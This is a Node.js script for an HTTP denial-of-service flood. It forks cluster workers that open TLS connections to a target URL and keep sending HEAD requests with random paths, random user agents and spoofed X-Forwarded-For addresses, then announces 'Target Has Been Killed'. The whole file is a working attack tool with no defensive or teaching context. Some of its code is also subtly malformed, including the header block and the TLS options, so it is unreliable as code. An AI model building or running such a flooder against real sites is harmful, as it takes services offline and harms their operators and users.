const cluster = require("cluster");
const tls = require("tls");
const net = require("net");
const crypto = require("crypto");

const randomUseragent = require("random-useragent");
const randomString = require("random-string");

const constants = crypto.constants;

function ipSpoofing() {
    const randomByte = () => Math.floor(Math.random() * 256);
    const ip = Array.from({ length: 4 }, randomByte).join(".");
    return ip;
}

function generatePayload() {
    const parsedUrl = args.url;
    const userAgent = randomUseragent.getRandom();
    const spoofedIp = ipSpoofing();
    const randomPath = randomString();

    let payload = `HEAD /${randomPath} HTTP/1.1\r\n`;
    payload += `Host: ${parsedUrl.hostname}\r\n`;
    payload += `Referer: ${parsedUrl.href}\r\n`;
    payload += `Origin: ${parsedUrl.href}\r\n`;
    payload += `User-Agent: ${userAgent}\r\n`;
    payload += `X-Forwarded-For: ${spoofedIp}\r\n`;
    payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n";
    payload += "Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8\r\n";
    payload += "Cache-Control: max-age=0\r\n";
    payload += "Upgrade-Insecure-Requests: 1\r\n";
    payload += "Connection: Keep-Alive\r\n";
    payload += "Name=Gareth+Wylie&Age=24&Formula=a+%2B+b+%3D%3D+13%25%21\r\n";
    payload += "\r\n";
    
    return payload;
}

function establishTlsContext(socket) {
    const parsedUrl = args.url;

    const options = { 
        ciphers: "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA",
        secureProtocol: ['TLSv1_2_method', 'TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2', 'TLS_OP_NO_TLS_1_1', 'TLS_OP_NO_TLS_1_0'],
        honorCipherOrder: true,
        requestCert: false,
        secureOptions: constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_TLSv1,
        servername: parsedUrl.hostname,
        secure: true,
        rejectUnauthorized: false,
        socket: socket
    };

    tls.authorized = true;
    tls.sync = true;

    const tlsStream = tls.connect(
        parsedUrl.port || 443, 
        parsedUrl.hostname, 
        options
    );

    tlsStream.on("data", function(data) {
        // console.log(data.toString("utf-8"));
    }).on("error", function(err) {

    }).on("timeout", function() {

    }).on("disconnected", function() {

    });

    return tlsStream;
}

function runKiller() {
    const parsedUrl = args.url;
    const payloadBytes = args.payload.bytes;

    const addr = {
        host: parsedUrl.hostname,
        port: parsedUrl.port || 443
    };

    const socket = net.connect(addr, function() {
        // Socket connected successfully
        const tlsStream = establishTlsContext(socket);

        for (let x = 0;x < args.rpc; x++) {
            tlsStream.setKeepAlive(true);
            tlsStream.setTimeout(3600000);

            tlsStream.write(payloadBytes);
        }
    }); 

    socket.setKeepAlive(true);
    socket.setTimeout(3600000);

    socket.on("timeout", function() { socket.destroy(); return; });
    socket.on("error", function(err) { socket.destroy(); return; });
}

//Main function to start workers
function main() {
    if (cluster.isMaster) {
        console.log("Killing...");

        for (let x = 0;x < args.threads;x++) {
            cluster.fork();
        }
        console.log("Forking All Cluster Done...")

        setTimeout(function() {
            console.log("Target Has Been Killed...");
            process.exit(0);
        }, args.time * 1000);
    } else {
        setInterval(runKiller);
    }
}

//Start Execution
if (process.argv.length < 6) {
    console.log(`Usage: node <url> <rpc> <threads> <time>`); 
    process.exit();
}

const args = {
    url: new URL(process.argv[2]),
    rpc: parseInt(process.argv[3]),
    threads: parseInt(process.argv[4]),
    time: parseInt(process.argv[5]),
    payload: {}
};

args.payload.raw = generatePayload();
args.payload.bytes = new Buffer.from(args.payload.raw);

main()
